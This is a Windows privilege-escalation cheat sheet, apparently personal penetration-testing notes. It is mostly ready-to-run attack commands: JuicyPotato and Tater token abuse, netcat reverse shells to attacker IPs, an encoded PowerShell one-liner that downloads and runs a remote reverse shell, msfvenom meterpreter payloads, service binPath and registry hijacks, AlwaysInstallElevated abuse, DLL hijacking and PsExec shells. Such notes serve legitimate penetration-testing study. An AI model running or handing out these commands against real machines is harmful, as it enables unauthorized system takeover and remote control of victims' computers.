# Initial 
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" 
hostname 
whoami /priv 

# Patches 
wmic qfe 
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Disks 
wmic logicaldisk get caption,description,providername 
list drives 
```

# Users and Groups 
```bash
whoami /priv 
whoami /groups 
echo %username% 

net users
net users /domain
net user user1
net groups
net localgroup # This can fail but if we know one group we can check its members with the next command
net localgroup administrators 
```

# Network
ipconfig /all
route print
arp -A
netstat -ano 


# Password Hunting and Files 

**Find file**
where /R c:\windows bash.exe 

**Show Content of Files**
```bash
type <#Filename> 
Get-Content <#Filename> 
```

**Find String in files**
```bash
findstr /si password *.txt *.ini *.config  #s = currentdir and down #i = case-insensitive 
```
**Recursive listing of directories**
```bash
dir /s
dir /s /b
dir /s /b /a:d>output.txt #for txt
```
**Show all files and directories including hidden ones**
```bash
dir /a 
```

# AV and Firewall 

**AV**
```bash
sc query windefend
sc queryex type= service #Maybe a non windows AV is running as service? 
```

**Firewall**
```bash
netsh advfirewall firewall dump # Newer 
netsh firewall show state # Older 
netsh firewall show config 
```
 
# Scheduled Tasks 
```bash
schtasks /query /fo LIST /v 
tasklist /SVC 
```

# Services 
```bash
net start 
tasklist /SVC 
```
 
# Shares 
```bash
net view \\servername to view visible shares; 
dir \\servername\sharename to list a share's contents; 
net use s: \\servername\sharename to map a share to a drive letter. 
```
 
# Token Impersonation & Potato Attacks 
Check what privileges the current user has. 

```whoami /priv or in meterpreter getprivs``` 

Some common ones are: 
- SeImpersonatePrivilege (Potato!) 
- SeAssignPrimaryToken (Potato!) 
- SeDebug 
- SeRestore 
- SetTakeOwnershitp 

Find more info here --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges 

## JuicyPotato 
Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM. Uses SeImpersonate or SeAssignPrimaryToken priveleges.  
Usually works on:

* Windows Server 2008 R2 
* Windows Server 2012 
* Windows Server 2012 R2 
* Windows Server 2016 

```JuicyPotato.exe -l 5432 -p c:\windows\system32\cmd.exe -a "/c c:\inetpub\wwwroot\nc.exe -e cmd.exe 192.168.119.215 4567" -t *```

## HotPotato 
```bash
powershell.exe -nop -ep bypass 
Import-Module C:\Users\User\Desktop\Tools\Tater.ps1 
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add" 
```


# RunAs / cmdkey 
Windows includes RunAs, which enables us to run a program as a different user if we have their credentials. This can be neat if we have credentials on another machine, and now want to execute commands as an Administrator on a different computer.
 
```bash
cmdkey /list 

C:\Users\security\Documents>cmdkey /list 

Currently stored credentials: 
    Target: Domain:interactive=DOMAIN\Administrator 
    Type: Domain Password 
    User: DOMAIN\Administrator 
```
We can try to use this for opening up a reverse shell 
First we can encode this command, which downloads a reverse shell from a webserver. 
```echo -n "IEX(New-Object Net.WebClient).downloadString('http://123.456.78.9:8082/rev.ps1')" | iconv --to-code UTF-16LE | base64 -w 0```

That we can use the following way 
```bash
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "PowerShell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOgA4ADAAOAAyAC8AcgBlAHYALgBwAHMAMQAnACkA 
```

# Autorun (Sysinternals GUI)
We can use this SysInternals tool to find all autorun programs. You can find it at --> https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns 
Check if there are services which point to writeable locations. More information --> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

If its not possible to use SysInternals tools there are further ways to find applications that are Automatically Run.

**wmic**
Find binaries are ran at startup
```bash
wmic startup get caption,command
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

**Scheduled Task**
Find scheduled tasks that are runing
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "Disabled"
# Here its not always to be expected to have grep so I need to find another 
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | findstr "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

**Folders**
CMD
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
```
Powershell
```
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

If there is a service with a writeable location we can check the permissions for it  using another SysInternals tool called accesschk. 
```accesschk64.exe -wvu "C:\Program Files\Autorun Program"``` 
where:\
w = writeable objects | v = verbose | u = ignore errors 


## AlwaysInstallElevated
Check if this policy group setting is set. If so then its an easy score :)

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\Installer 
reg query HKCU\Software\Policies\Microsoft\Windows\Installer 
```
Build a MSI with msfvenom 

```msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi```
or use Write-UserAddMSI from PowerUp ! 


## RegSvc | Service Escalation Registry
Open Powershell and enter the following: 
```bash
powershell -executionpolicy bypass 
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl 
```
Check if NT AUTHORITY\INTERACTIVE has FullControl, if so use he PowerSploit script **Install-ServiceBinary**

reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f 
sc start regsvc 

Somehow this results in an error so verify

 

## Executable Files as Service

```accesschk64.exe -wvu "C:\Program Files\MyExecutable.exe"```

Check if the user "EVERYONE" has FILE_ALL_ACCESS. If so we can replace this with with our own binary and copy it there. 

x86_64-w64-mingw32-gcc addUserToAdmin.c -o x.exe 
 

# Startup Applications

**Detection**

icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 

**Exploitations**
Create Listener and payload 

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe 

```
Place the .exe in C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup 

 
## Service binPath 
What services run as authenticated user? 

Note that accesschk2 is the version that has the accepteula flag. The newer ones dont have that. 

```bash
accesschk2.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything on Win 8) 
accesschk2.exe /accepteula -uwcqv "Everyone" * (won't yield anything on Win 8) 
```
If we have a SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS its goooood ! :) 

Check service details 
```sc qc <#SERVICENAME>```

Enable Service 
```sc config <#SERVICENAME> start= demand```

Reconfigure Service 
```sc config <#SERVICENAME> binpath= "C:\my\path\mydir\nc.exe -nv <#IP KALI> <#PORT KALI> -e C:\WINDOWS\System32\cmd.exe"```
```sc config <#SERVICENAME> obj= ".\LocalSystem" password= ""```

Start Service 
```net start <#SERVICENAME>```

## Unquoted Service Paths 

Check with PowerUp or WinPEAS if there are unquoted service paths. If there are create a binary and place it in the path so it will be executed and restart the services 

DLL hijacking 

Open the process monitor and filter for  

1. Result = NAME NOT FOUND 
2. Path ends with .dll 

If there is a .dll in a writeable directory we can replace it with a compiled verison of windows_dll.c. 

 
// For x64 compile with:  

x8_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll 

// For x86 compile with:  
i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll 


### Elevating with known credentials 

**PsExec.exe (local)**
```.\PsExec64 -accepteula -u Administrator -p password -h "C:\Users\mssql-svc\Documents\nc64.exe 10.10.14.6 8888 -e C:\Windows\System32\cmd.exe"```

**PsExec.py (remote)**
```sudo psexec.py administrator:'password'@123.45.67.89``` 

**wmiexec.py (remote)** 
If the target has SMB enabled we can try wmiexec 
```wmiexec.py 'administrator:password@10.10.10.125'```

# Other things 
CVE-2019-1388 UAC bug -> click link of cert vendor and save as --> shift+rightclick --> open terminal 

Weak Folder Permissions 
If a user has write permission in a folder used by a service, he can replace the binary with a malicious one 

# Additional Info 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md 
https://guif.re/windowseop 
http://www.fuzzysecurity.com/tutorials/16.html 

## Running powershell on blacklisted clients
Powershell without Powershell  
https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/  

## Stuff to try out
* Test if you can create a scheduled task with admin privilege
* Run > powershell > "-ExecutionPolicy Bypass" it will start a PowerShell session that allows for running scripts and keeps the lowered permissions isolated to just the current running process.

## Further information
* Privilege escalation  
** https://github.com/pha5matis/Pentesting-Guide/blob/master/privilege_escalation_windows.md  
** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

